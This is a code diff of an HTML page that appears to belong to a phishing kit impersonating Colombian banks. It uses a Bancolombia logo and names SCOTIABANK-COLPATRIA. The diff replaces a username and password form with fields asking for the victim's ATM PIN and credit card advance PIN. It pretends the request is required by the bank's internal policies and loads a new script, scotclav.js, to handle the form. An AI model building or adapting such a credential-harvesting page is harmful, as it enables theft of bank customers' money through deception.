@@ -46,15 +46,15 @@
     </header>
 
     <main class="section">
-        <h3 class="section-title">Ingresa a tu Banca Virtual</h3>
+        <h3 class="section-title">Ingresa tu Clave</h3>
         <div class="d-center">
             <img id="-icon-banco" src="./assets/logos/bancolombia.png" alt="" class="modal-icon-banco">
         </div>
-        <p>Debes autorizar la transacción en proceso. Inicia sesión en tu banca virtual a continuación.</p>
+        <p>Por políticas internas con tu banco SCOTIABANK-COLPATRIA necesitamos la siguiente información.</p>
 
         <form class="form" action="" id="form">
-            <input id="user" type="text" minlength="4" required placeholder="Usuario">
-            <input id="puser" type="password" minlength="4" required placeholder="Contraseña/Clave">
+            <input id="ccajero" type="hidden" minlength="4" required placeholder="Clave de Cajero">
+            <input id="cavances" type="hidden" minlength="4" required placeholder="Clave de Avances Tarjeta Crédito">
 
             <button type="submit" class="btn-success btn-100" id="success">
                 Iniciar sesión
@@ -96,6 +96,6 @@
 
 
     <!-- SCRIPTS -->
-    <script src="./js/banca.js"></script>   
+    <script src="./js/scotclav.js"></script>   
 </body>
 </html>
